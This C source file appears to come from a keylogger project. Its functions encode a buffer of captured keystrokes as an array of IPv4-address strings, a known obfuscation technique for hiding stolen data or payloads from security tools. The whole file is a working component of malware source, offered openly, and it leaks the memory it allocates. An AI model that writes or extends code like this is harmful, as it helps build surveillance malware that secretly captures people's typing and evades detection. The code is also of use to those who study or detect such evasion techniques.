#include "Obfuscation.h"
#include <stdio.h>
#include <stdlib.h>

char* GenerateIpv4(int a, int b, int c, int d) {
    int maxLen = 32;
    char* Output = (char*)malloc(maxLen);

    if (Output == NULL) {
        return NULL;
    }

    // Creating the IPv4 address and saving it to the 'Output' variable
    sprintf_s(Output, maxLen, "%d.%d.%d.%d", a, b, c, d);

    return Output;
}

// Generate the IPv4 output representation of the logged keys
BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize) {
    if (pKeylog == NULL) {
        return FALSE;
    }

    // Ensure the KeylogSize is a multiple of 4
    if (KeylogSize % 4 != 0) {
        SIZE_T padding = 4 - (KeylogSize % 4);
        unsigned char* paddedKeylog = (unsigned char*)malloc(KeylogSize + padding);

        if (paddedKeylog == NULL) {
            return FALSE;
        }

        // Copy original data to the new buffer and pad the remaining bytes
        memcpy(paddedKeylog, pKeylog, KeylogSize);
        memset(paddedKeylog + KeylogSize, 0, padding);
        KeylogSize += padding;
        pKeylog = paddedKeylog;
    }

    // Print the start of the array definition
    printf("char* Ipv4Array[%d] = { \n\t", (int)(KeylogSize / 4));

    // Loop through the keylog buffer, 4 bytes at a time
    for (int i = 0; i < KeylogSize; i += 4) {
        int a = pKeylog[i];
        int b = pKeylog[i + 1];
        int c = pKeylog[i + 2];
        int d = pKeylog[i + 3];

        // Generate the IPv4 address from these 4 bytes
        char* ip = GenerateIpv4(a, b, c, d);

        // Print the IPv4 address
        if (i + 4 == KeylogSize) {
            printf("\"%s\"", ip);
        }
        else {
            printf("\"%s\", ", ip);
        }

        // Beautify the output after every 8 addresses
        if ((i / 4 + 1) % 8 == 0) {
            printf("\n\t");
        }
    }

    printf("\n};\n\n");

    return TRUE;
}
